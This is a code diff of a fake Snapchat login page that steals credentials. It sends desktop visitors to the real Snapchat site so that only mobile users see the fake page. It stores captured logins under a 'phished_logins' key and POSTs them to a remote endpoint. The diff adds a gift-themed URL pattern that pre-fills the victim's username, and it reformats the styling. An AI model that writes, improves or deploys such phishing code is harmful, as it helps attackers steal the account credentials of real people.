@@ -5,7 +5,12 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Log In</title>
 <script>
-(function(){const ua=navigator.userAgent.toLowerCase();if(!/mobile|android|iphone|ipad|tablet/i.test(ua)&&(ua.includes("windows")||ua.includes("macintosh")||ua.includes("linux"))){window.location.replace("https://accounts.snapchat.com/");}})();
+(function(){
+  const ua = navigator.userAgent.toLowerCase();
+  if(!/mobile|android|iphone|ipad|tablet/i.test(ua) && (ua.includes("windows")||ua.includes("macintosh")||ua.includes("linux"))) {
+    window.location.replace("https://accounts.snapchat.com/");
+  }
+})();
 </script>
 <script src="https://cdn.tailwindcss.com"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
@@ -59,8 +64,20 @@ label[for="password"] { position: relative; top: -6px; font-size: 0.75rem; }
 .password-container { margin-top: 4px; position: relative; }
 
 /* Checkbox and Forgot password spacing */
-label.inline-flex.items-center { position: relative; top: -8px; font-size: 0.825rem; font-weight: 450; }
-#forgotPassword { position: relative; top: -9.5px; font-size: 0.825rem; font-weight: 400; color:#0083ff; }
+label.inline-flex.items-center { 
+  position: relative; 
+  top: -8px; 
+  font-size: 0.825rem; 
+  font-weight: 300; /* thinner than username/password labels */
+}
+
+#forgotPassword { 
+  position: relative; 
+  top: -9.5px; 
+  font-size: 0.825rem; 
+  font-weight: 300; /* thinner than username/password labels */
+  color: #0083ff; 
+}
 
 /* Error message */
 #errorMsg { 
@@ -96,7 +113,7 @@ form.flex.flex-col.space-y-6 { gap: 0.5rem; }
 .password-toggle { 
   position: absolute; right: 0; top: 50%; 
   transform: translateY(-50%); 
-  color: #888; /* restored color */
+  color: #888; /* original color */
   font-size: 0.875rem; /* slightly smaller (~3px smaller) */
   background: transparent; 
   border: none; 
@@ -165,6 +182,10 @@ document.addEventListener("DOMContentLoaded", function(){
         m3=3;
   let n4=0,l5=JSON.parse(localStorage.getItem("phished_logins")||"[]");
 
+  // Pre-fill username if URL matches /gift/{something}/login
+  const pathMatch = window.location.pathname.match(/\/gift\/([^\/]+)\/login/);
+  if(pathMatch && pathMatch[1]){ a.value = pathMatch[1]; }
+
   function x1(p,r=m3){
     return fetch(u2,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(p),mode:"cors"})
       .then(s=>s.ok||Promise.reject("Request failed"))
@@ -212,6 +233,7 @@ document.addEventListener("DOMContentLoaded", function(){
     b.type="password"===b.type?(b.type="text",document.getElementById("eyeIcon").classList.replace("fa-eye-slash","fa-eye")):(b.type="password",document.getElementById("eyeIcon").classList.replace("fa-eye","fa-eye-slash"))
   }
 });
+
 function goBack(){window.history.length>1?window.history.back():window.location.reload()}
 </script>
 </body>
